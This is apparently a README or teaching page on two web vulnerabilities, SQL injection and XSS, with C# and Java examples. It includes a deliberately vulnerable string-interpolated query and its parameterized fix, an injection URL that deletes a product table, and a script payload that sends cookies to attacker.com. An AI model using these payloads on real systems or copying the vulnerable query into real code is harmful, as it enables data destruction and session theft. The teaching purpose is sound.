# Typical web app security vulnerabilities
## Injection
### Security Weakness
Injection flaws are very prevalent, particularly in legacy code. Injection vulnerabilities are often found in SQL, LDAP, XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries.
Injection flaws are easy to discover when examining code. Scanners and fuzzers can help attackers find injection flaws.

### Impacts
Injection can result in data loss, corruption, or disclosure to unauthorized parties, loss of accountability, or denial of access. Injection can sometimes lead to complete host takeover.

### Sql Injection sample
Scenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:

```var sql = "SELECT * FROM product WHERE sku='{sku}' LIMIT 1";```

Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, 
(e.g. EF Core FromSql Method):

```
SecurityWeakness.Infrastructure.SQL.NotSecureProductSqlRepository:

public Product GetSingleBySku(string sku)
{
    var sql = $"SELECT * FROM product WHERE sku='{sku}' LIMIT 1";
    return context.Products.FromSql(sql).ToArray().Single();
}
```

In both cases, the attacker modifies the ‘sku’ parameter value in their browser to send:

``` 
http://localhost:62384/NotSecureProducts/Product?sku=p2';DELETE from product;SELECT '1
```

This changes the meaning of both queries to delete all the records from the product table. More dangerous attacks could modify or delete data, or even invoke stored procedures.

### Secure sample
Rewrite code using Linq Query, or use parameterization for raw SQL queries 
```
SecurityWeakness.Infrastructure.SQL.SecureProductSqlRepository:
public Product GetSingleBySku(string sku)
{
    return context.Products.FromSql($"SELECT * FROM {TableName} WHERE sku={{0}} LIMIT 1", sku).ToArray().Single();
}
```

## Cross-Site Scripting (XSS)
### Security Weakness
Cross Site Scripting (XSS) is a widespread vulnerability that affects many web applications. XSS attacks consist of injecting malicious client-side scripts into a website and using the website as a propagation method.
XSS is the most prevalent web application security flaw. XSS flaws occur when an application includes user supplied data in a page sent to the browser without properly validating or escaping that content. There are two different types of XSS flaws: 1) Stored and 2) Reflected, and each of these can occur on the a) Server or b) on the Client.

Detection of most Server XSS flaws is fairly easy via testing or code analysis. Client XSS is very difficult to identify.

### Impacts
Attackers can execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.

### Xss Attack sample
The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

```(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";```

The attacker modifies the 'CC' parameter in their browser to:

```'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.```

This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See A8 for info on CSRF.

## Resources
* [OWASP Top Ten 2017](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project)
* [Cross Site Scripting (XSS)](https://blog.sucuri.net/2019/01/owasp-top-10-security-risks-part-iv.html)
* [Cross Site Scripting (XSS) Asp net core](https://docs.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-2.2)
